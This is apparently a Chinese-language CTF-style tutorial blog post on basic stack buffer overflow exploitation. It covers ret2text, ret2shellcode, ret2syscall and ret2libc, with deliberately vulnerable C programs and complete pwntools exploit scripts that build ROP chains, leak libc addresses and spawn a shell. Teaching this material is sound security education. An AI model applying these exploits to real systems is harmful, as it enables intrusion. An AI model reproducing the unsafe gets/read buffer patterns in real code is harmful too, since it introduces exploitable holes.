---
title: 基本ROP
pubDate: 2026-03-09T15:46:00
category: Pwn小知识
tags:
  - Pwn
  - Stack
  - ret2text
  - ret2syscall
  - ret2shellcode
  - ret2libc
---
## ret2text

ret2text (Return to Text) 是 Pwn 中最基础、最简单的一种栈溢出攻击技术。

顾名思义，它的核心含义是：控制程序的返回地址（Return Address），让它跳转到程序代码段（.text 段）中已有的、我们期望执行的代码位置。

### ret2text 的核心原理

程序本身包含了一个后门函数（比如直接打印 flag 或执行 `system("/bin/sh")`）或者一段有用的代码片段。

我们通过输入超长的数据，覆盖掉栈上的返回地址。

我们将返回地址修改为后门函数的地址。

当当前函数执行 `ret` 指令时，CPU 就会“乖乖地”跳转到后门函数去执行，而不是返回原来的调用者。

#### 适用条件

存在栈溢出漏洞。

程序中存在可利用的后门函数或代码片段。

通常要求关闭 PIE (地址随机化)：如果不关闭 PIE，代码段的地址每次运行都会变，我们就不知道后门函数在哪了（除非先泄露地址）。

可以开启 NX (堆栈不可执行)：因为 ret2text 是跳转到已有的代码段去执行，而不是在栈上执行我们写入的 shellcode，所以它不怕 NX 保护。

### 典型的 ret2text 例子

#### (1) 漏洞源码 (C语言)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// 这是一个后门函数，正常逻辑下永远不会被调用
void backdoor() {
    puts("Success! Here is your shell.");
    system("/bin/sh");
}

void vuln() {
    char buffer[20];
    puts("Input something:");
    // 漏洞点：gets 不检查长度，导致溢出
    gets(buffer); 
}

int main() {
    vuln();
    return 0;
}
```

**编译命令**（为了演示方便，我们关闭 PIE 和 Canary）：

```bash
gcc -no-pie -fno-stack-protector -o pwn_me source.c
```

#### (2) 攻击分析

第一步：确定溢出偏移 (Offset)
我们需要知道输入多少个垃圾字符后，才能刚好碰到“返回地址”。

`buffer` 大小是 20 字节。
在 64 位系统中，通常栈布局是：`[buffer] + [saved_rbp (8字节)] + [return_address (8字节)]`。
虽然 buffer 申明是 20，但编译器可能会对齐（比如给 24 或 32 字节）。
假设通过调试（如使用 gdb 或 `cyclic`）发现，偏移量是 32 字节后紧接着就是返回地址。

第二步：找到后门地址 (Address)
因为关闭了 PIE，函数的地址是固定的。我们可以用 `objdump` 或 IDA 查看 `backdoor` 函数的地址。

```bash
objdump -d pwn_me | grep backdoor
# 输出示例：
# 0000000000401176 <backdoor>:
```

这里 `0x401176` 就是我们的目标地址。

#### (3) 构造 Payload

Payload 的结构如下：
`[ 'A' * 偏移量 ] + [ backdoor_addr ]`

填充：32 个 'A' (覆盖 buffer 和 old ebp)
返回地址：`0x401176` (覆盖原本的 return address)

#### (4) Exploit 脚本 (Pwntools)

```python
from pwn import *

# 1. 设置目标
context(os='linux', arch='amd64', log_level='debug')
p = process('./pwn_me')
elf = ELF('./pwn_me')

# 2. 获取相关信息
# 如果是自动获取后门地址
backdoor_addr = elf.symbols['backdoor']
log.success(f"Backdoor Address: {hex(backdoor_addr)}")

# 3. 构造 Payload
# 偏移量是 32 (假设通过调试得出的)
offset = 32

# p64() 用于将整数打包成 64位的二进制地址 (小端序)
# 相当于把 0x401176 变成 b'\x76\x11\x40\x00\x00\x00\x00\x00'
payload = flat([
    b'A' * offset,
    backdoor_addr
])

# 4. 发送 Payload
p.recvuntil("Input something:\n")
p.sendline(payload)

# 5. 获取交互 Shell
p.interactive()
```

### 常见问题：Stack Alignment (栈对齐)

在 64 位系统（尤其是 Ubuntu 18.04+）中，可能会遇到一个坑：脚本写得对，地址也对，但程序跳转到 `system` 时崩溃了。

原因：CPU 的 SIMD 指令集（如 `movaps`）要求栈指针 `rsp` 必须是 16 字节对齐的（以 0 结尾）。

解决方法：
在跳转到 `backdoor` 之前，先跳到一个 `ret` 指令（`ret` gadget）。
`ret` 指令的作用相当于 `pop rip`，它会让栈指针移动 8 字节，从而再次把栈对齐。

修正后的 Payload：

```python
ret_addr = 0x40101a # 用 ROPgadget 找一个 ret 指令的地址
payload = flat([
    b'A' * offset,
    ret_addr,       # 先跳这里，对齐栈
    backdoor_addr   # 再跳后门
])
```

## ret2shellcode

ret2shellcode (Return to Shellcode) 是一种非常经典的栈溢出攻击方式。

它的核心原理是：攻击者自己编写或注入一段恶意的机器码（即 Shellcode）到程序的内存中（通常是栈上），然后通过栈溢出修改返回地址，让 CPU 跳转到这段注入的代码上去执行。

### 关键前提条件

要成功实施 ret2shellcode，必须满足以下两个条件：

没有开启 NX 保护 (No-Execute / DEP)：

这是最关键的。内存中的栈段（Stack）必须拥有 可执行（Executable） 权限。

如果开启了 NX，栈只能读写不能执行（RW-），CPU 跳转到栈上执行代码时会直接报 Segmentation Fault。

我们要知道 Shellcode 在内存中的地址：

我们需要知道我们注入的 Shellcode 存在哪（通常是 buffer 的起始地址），这样才能把返回地址改成它。

### 一个典型的 ret2shellcode 例子

#### 漏洞源码 (C语言)

为了演示，我们需要在编译时关闭 NX 保护。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void vuln() {
    char buf[100];
    printf("The address of buf is: %p\n", buf); // 为了简化难度，题目直接告诉了我们 buf 的地址
    puts("Input your shellcode:");
    read(0, buf, 200); // 漏洞点：buf 只有 100，但读了 200，存在溢出
}

int main() {
    vuln();
    return 0;
}

```

编译命令（关键参数 `-z execstack`）：

```bash
# -z execstack: 关闭 NX 保护，让栈可执行
# -fno-stack-protector: 关闭 Canary 保护
# -no-pie: 关闭地址随机化 (方便演示)
gcc -z execstack -fno-stack-protector -no-pie -o pwn_shell source.c

```

#### 攻击分析

目标：执行 `system("/bin/sh")` 拿到 Shell。
问题：程序里没有 `system` 函数，也没有 `/bin/sh` 字符串。
对策：我们把生成 Shell 的机器码（Shellcode）作为输入发给 `read`，存到 `buf` 里。然后把返回地址改成 `buf` 的地址。

Payload 结构设计：
我们希望栈变成这样：

```text
高地址
+------------------+
| buf 的地址        |  <-- 覆盖原本的 Return Address (让 CPU 跳回 buf)
+------------------+
| ... 填充数据 ...  |  <-- 填满 buffer 剩下的空间 + 覆盖 old ebp
+------------------+
|                  |
|   Shellcode      |  <-- 我们的恶意代码
| (execve /bin/sh) |
|                  |
+------------------+  <-- buf 的起始地址 (ESP 指向这附近)
低地址

```

计算偏移：

`buf` 大小是 100。
通常会有一些对齐或者 old ebp（32位是4字节，64位是8字节）。
假设通过调试（gdb `cyclic`）发现，偏移量是 112 字节后碰到返回地址。

#### Exploit 脚本 (Pwntools)

这里我们使用 Pwntools 自动生成 Shellcode。

```python
from pwn import *

# 1. 设置环境
context(os='linux', arch='amd64', log_level='debug')
# context.arch = 'i386' # 如果是 32 位程序记得改这个

p = process('./pwn_shell')

# 2. 接收程序泄露的栈地址
# 题目中 printf("... %p\n", buf) 会打印 buf 地址
p.recvuntil("The address of buf is: ")
buf_addr_str = p.recvline().strip()
buf_addr = int(buf_addr_str, 16)

log.success(f"Buffer Address: {hex(buf_addr)}")

# 3. 准备 Shellcode
# Pwntools 自带生成 shellcode 的功能
# asm() 将汇编代码编译成机器码字节流
shellcode = asm(shellcraft.sh())

# 打印一下看看 shellcode 有多长，确保 buf 放得下
log.info(f"Shellcode length: {len(shellcode)}") 

# 4. 构造 Payload
# 结构：[ Shellcode ] + [ Padding ] + [ Return Address ]

# 计算需要填充的长度：总偏移 112 - Shellcode 长度
padding_len = 112 - len(shellcode)

payload = flat([
    shellcode,                  # 先放 shellcode
    b'A' * padding_len,         # 再填满剩下的空间
    buf_addr                    # 最后覆盖返回地址，指向 buf 开头
])

# 5. 发送 Payload
p.sendline(payload)
p.interactive()

```

### 进阶技巧：NOP Sled (滑雪梯)

在实际情况中，我们可能并不精准知道 `buf` 的起始地址（比如可能受环境变量影响偏移了几个字节）。如果跳歪了，跳到了 Shellcode 中间，程序就会崩溃。

为了增加成功率，我们通常在 Shellcode 前面铺一层 NOP 指令 (`\x90`)。

NOP：No Operation，CPU 遇到这个指令什么都不做，直接执行下一条。
原理：只要返回地址跳到了 NOP 区域的任意位置，CPU 就会像滑滑梯一样一路滑下来，最终滑进我们的 Shellcode。

更稳健的 Payload 结构：
`[ NOPs ] + [ Shellcode ] + [ Padding ] + [ Ret Addr (指向 NOP 中间) ]`


## ret2syscall

ret2syscall (Return to System Call) 是一种利用 ROP (Return Oriented Programming) 技术来绕过 NX (No-Execute) 保护的攻击手段。

它的核心原理是：我们不再依赖程序里现有的函数（如 `system`）或自己写入的 Shellcode，而是利用程序中零散的汇编指令片段（Gadgets），拼凑出一套“系统调用（System Call）”的参数，最后执行系统调用指令进内核拿 Shell。

### ret2syscall 的核心原理

要理解 ret2syscall，必须先理解 Linux 系统是如何执行系统调用的。

#### 为什么要用它？

* NX 开启：栈不可执行，无法使用 `ret2shellcode`。
* 静态编译 (Statically Linked)：这是 `ret2syscall` 最常见的应用场景。静态编译的程序没有动态链接库 (libc)，虽然体积大，但里面包含了大量的代码片段（Gadgets），非常适合我们在里面“淘宝”凑指令。
* 没有 `system` 函数**：程序里没调用过 `system`，无法直接 `ret2text`。

#### 系统调用规则 (以 32位 x86 为例)

在 Linux 32位系统中，触发系统调用（如 `execve`）需要满足以下寄存器状态：

| 寄存器 | 作用       | 目标值 (执行 execve)           |
| ------ | ---------- | ------------------------------ |
| EAX    | 系统调用号 | 0xb (十进制 11，代表 `execve`) |
| EBX    | 第一个参数 | 指向 "/bin/sh" 字符串的地址    |
| ECX    | 第二个参数 | 0 (NULL)                       |
| EDX    | 第三个参数 | 0 (NULL)                       |
| 指令   | 触发调用   | `int 0x80`                     |

攻击逻辑：
我们需要在栈上构造一个 ROP 链，利用 `pop` 指令把栈上的数据弹入寄存器，最后跳转到 `int 0x80`。

### 一个典型的 ret2syscall 例子

假设我们有一个静态编译的 32 位程序 `pwn_static`。

#### 漏洞源码

```c
// gcc -m32 -static -fno-stack-protector -o pwn_static source.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[32];
    puts("Give me some gadgets:");
    read(0, buf, 200); // 典型的栈溢出
}

int main() {
    vuln();
    return 0;
}

```

#### 攻击准备：寻找 Gadgets

我们需要用工具（如 `ROPgadget`）在二进制文件里寻找能够操作寄存器的指令片段。

我们需要凑齐：

1. 控制 EAX: `pop eax; ret`
2. 控制 EBX, ECX, EDX: `pop ebx; pop ecx; pop edx; ret` (或者分开找)
3. 字符串: `/bin/sh` 的地址
4. 触发指令: `int 0x80`

模拟查找过程：

```bash
# 1. 找控制 eax 的 gadget
$ ROPgadget --binary pwn_static --only "pop|ret" | grep eax
0x0809c376 : pop eax ; ret

# 2. 找控制 ebx, ecx, edx 的 gadget
$ ROPgadget --binary pwn_static --only "pop|ret" | grep "pop edx"
# 假设找到了一个完美的合体 gadget (常见于静态编译程序)
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret

# 3. 找 "/bin/sh" 字符串
$ ROPgadget --binary pwn_static --string "/bin/sh"
0x080be408 : /bin/sh

# 4. 找 int 0x80
$ ROPgadget --binary pwn_static --opcode "cd80"
0x08049421 : int 0x80

```

#### 构造 Payload

我们需要在栈上精心排列数据，让 `pop` 指令像吃豆人一样，把我们放在栈上的数据“吃”进寄存器。

栈布局设计：

```text
+-------------------+
|   Padding (44字节) | <-- 覆盖 buf + old_ebp
+-------------------+
| 0x0809c376        | <-- pop eax; ret
+-------------------+
| 0x0000000b        | <-- 0xb (execve号) -> 存入 EAX
+-------------------+
| 0x0806eb90        | <-- pop edx; pop ecx; pop ebx; ret
+-------------------+
| 0x00000000        | <-- 0 -> 存入 EDX
+-------------------+
| 0x00000000        | <-- 0 -> 存入 ECX
+-------------------+
| 0x080be408        | <-- "/bin/sh"地址 -> 存入 EBX
+-------------------+
| 0x08049421        | <-- int 0x80 (触发系统调用)
+-------------------+

```

#### Exploit 脚本 (Pwntools)

```python
from pwn import *

context(os='linux', arch='i386', log_level='debug')
# p = process('./pwn_static')
elf = ELF('./pwn_static')

# 1. 获取 Gadgets 地址 (假设通过 ROPgadget 找到的)
pop_eax_ret = 0x0809c376
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
bin_sh_addr = 0x080be408

# 2. 构造 Payload
offset = 44 # 32(buf) + 4(alignment/padding) + 4(ebp) -> 需调试确认

payload = flat([
    b'A' * offset,
    
    # 第一步：设置 EAX = 0xb
    pop_eax_ret,
    0xb,
    
    # 第二步：设置 EBX, ECX, EDX
    # 注意顺序必须和 gadget 的 pop 顺序完全一致
    # gadget 是: pop edx ; pop ecx ; pop ebx ; ret
    pop_edx_ecx_ebx_ret,
    0,              # pop edx
    0,              # pop ecx
    bin_sh_addr,    # pop ebx
    
    # 第三步：触发中断
    int_0x80
])

# 3. 发送
# p.sendline(payload)
# p.interactive()

```

### 64位系统的区别 (ret2syscall 64-bit)

如果是 64 位程序，原理完全一样，但有三点不同：

1. 寄存器不同：

* 调用号存入 RAX (execve 是 59，即 0x3b)。
* 参数顺序：RDI (filename), RSI (argv), RDX (envp)。

1. 触发指令不同：

* 使用 `syscall` 而不是 `int 0x80`。

1. Gadget 查找：

* 你需要找 `pop rdi; ret`, `pop rsi; ret` 等。

### 总结

* ret2syscall = 收集 Gadgets -> 设置系统调用号和参数寄存器 -> 执行 syscall/int 0x80。
* 它是手动拼装出一个 `execve("/bin/sh")`。
* 它是对抗 静态编译 + NX 保护 的神器。

## ret2libc

ret2libc (Return to Libc) 是一种非常经典且常用的栈溢出攻击技术，主要用于绕过 NX (No-Execute) 保护。

它的核心原理是：既然我们无法在栈上执行 Shellcode（因为 NX 开启），那我们就去借用程序已经加载的动态链接库（libc.so）里的函数来帮我们干坏事。 最常用的目标就是 libc 里的 `system` 函数。

### ret2libc 的核心原理

要理解 ret2libc，需要搞懂两个概念：动态链接库 和 ASLR。

#### 为什么要借用 libc？

* 资源丰富：libc 是 Linux 下 C 语言的标准库，几乎所有程序都会加载它。里面包含了大量强大的函数（如 `system`, `execve`, `mprotect`）和字符串（如 `"/bin/sh"`）。
* 自带执行权限：libc 的代码段本身就是可执行的（r-x），NX 防不住它。

#### 难点：ASLR (地址空间布局随机化)

现代系统开启 ASLR 后，libc 每次加载到内存的基地址 (Base Address) 都是随机变化的。

* 我们不知道 `system` 函数现在的具体地址。
* 但是，libc 内部函数之间的相对偏移 (Offset) 是固定的（由 libc 版本决定）。

攻击公式：

1. 泄露 (Leak)：利用溢出调用 `puts` 或 `printf`，打印出某个已解析函数（如 `read` 或 `puts`）在 GOT 表中的真实地址。
2. 计算 (Calculate)：

* `libc_base` = `泄露地址` - `该函数的固定偏移`
* `system_addr` = `libc_base` + `system的固定偏移`
* `binsh_addr` = `libc_base` + `str_bin_sh的固定偏移`

1. 攻击 (Exploit)：再次触发溢出，调用 `system("/bin/sh")`。

### 一个典型的 ret2libc 例子 (32位)

为了方便理解栈结构，我们以 32位 程序为例（64位原理一样，只是传参方式不同）。

#### 漏洞源码

```c
// gcc -m32 -fno-stack-protector -o pwn_libc source.c
// 假设开启了 NX 和 ASLR
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[32];
    puts("Input:");
    read(0, buf, 100); // 溢出点
}

int main() {
    vuln();
    return 0;
}
```

#### 攻击步骤详解

假设我们拿到了二进制文件 `pwn_libc` 和目标系统使用的 `libc.so.6`。

栈布局目标（Payload 1 - 泄露）：
我们希望程序执行 `puts(puts_got)`，打印出 `puts` 的真实地址，然后返回到 `main` 函数（为了让我们有机会再次输入 Payload 2）。

```text
+---------------------+
| Padding (44字节)     | <-- 覆盖 buf + old_ebp
+---------------------+
| puts_plt            | <-- 返回地址：跳去执行 puts
+---------------------+
| main_addr           | <-- puts 执行完后的返回地址：跳回 main (以便第二次溢出)
+---------------------+
| puts_got            | <-- puts 的参数：打印 puts 在 GOT 表里的真实值
+---------------------+
```

栈布局目标（Payload 2 - Get Shell）：
我们已经算出了 `system` 的地址，现在要执行 `system("/bin/sh")`。

```text
+---------------------+
| Padding (44字节)     |
+---------------------+
| system_addr         | <-- 返回地址：跳去执行 system
+---------------------+
| 0xdeadbeef          | <-- system 执行完后的返回地址 (填垃圾数据，因为shell都要拿到了)
+---------------------+
| binsh_addr          | <-- system 的参数：指向 "/bin/sh"
+---------------------+
```

#### Exploit 脚本 (Pwntools)

```python
from pwn import *

context(os='linux', arch='i386', log_level='debug')
p = process('./pwn_libc')
elf = ELF('./pwn_libc')
# 需要指定正确的 libc 版本，如果是远程通常用 LibcSearcher 或提供的 libc
libc = ELF('/lib/i386-linux-gnu/libc.so.6') 

# ====================
# 第一步：泄露 Libc 地址
# ====================

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']
offset = 44 # 32(buf) + 4(ebp)，需调试确认

# 构造 Payload 1: puts(puts_got) -> return main
payload1 = flat([
    b'A' * offset,
    puts_plt,
    main_addr,    # 这里的关键：打完泄露要能回来！
    puts_got
])

p.recvuntil("Input:\n")
p.sendline(payload1)

# 接收泄露的地址
# u32() 解包 4 字节数据，ljust 补齐长度
leak_msg = p.recv(4)
puts_real_addr = u32(leak_msg.ljust(4, b'\x00'))
log.success(f"Leaked puts address: {hex(puts_real_addr)}")

# ====================
# 第二步：计算基址和目标地址
# ====================

# 核心公式：基址 = 真实地址 - 偏移量
libc_base = puts_real_addr - libc.symbols['puts']
log.success(f"Libc Base: {hex(libc_base)}")

# 计算 system 和 "/bin/sh" 的真实地址
system_addr = libc_base + libc.symbols['system']
# next() 用于获取生成器里的第一个结果
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

log.success(f"System Address: {hex(system_addr)}")
log.success(f"/bin/sh Address: {hex(binsh_addr)}")

# ====================
# 第三步：Get Shell
# ====================

# 构造 Payload 2: system("/bin/sh")
payload2 = flat([
    b'A' * offset,
    system_addr,
    0xdeadbeef,   # system 的返回地址，随便填
    binsh_addr    # system 的参数
])

# 因为程序跳回了 main，所以可以再次发送输入
p.recvuntil("Input:\n")
p.sendline(payload2)

p.interactive()
```

### 32位与64位的区别

上面的例子是 32 位的。如果是 64 位程序，ret2libc 的逻辑完全一样，但Payload 的构造有区别：

* 传参方式不同：
* 32位：参数放在栈上（就在函数地址下面）。
* 64位：参数优先放在寄存器（`RDI`, `RSI`, `RDX`...）。

* 需要 Gadget：
* 64位调用 `puts(puts_got)` 时，必须先用 `pop rdi; ret` 把 `puts_got` 放入 `RDI` 寄存器。
* 64位调用 `system("/bin/sh")` 时，必须先用 `pop rdi; ret` 把 `/bin/sh` 地址放入 `RDI` 寄存器。

64位 Payload 2 示例：
`Padding + [pop_rdi_ret] + [binsh_addr] + [system_addr]`
*(注意：64位不需要像32位那样在 system 和参数之间塞一个 4 字节的伪造返回地址，因为参数已经被 pop 走了)*

### 总结

* ret2libc = 泄露 (Leak) + 计算 (Calculate) + 调用 (Call)。
* 它是 Pwn 中最通用的技巧，专门用来对付 NX + ASLR。
* 核心思想是“就地取材”，利用系统中已有的 libc 库函数。
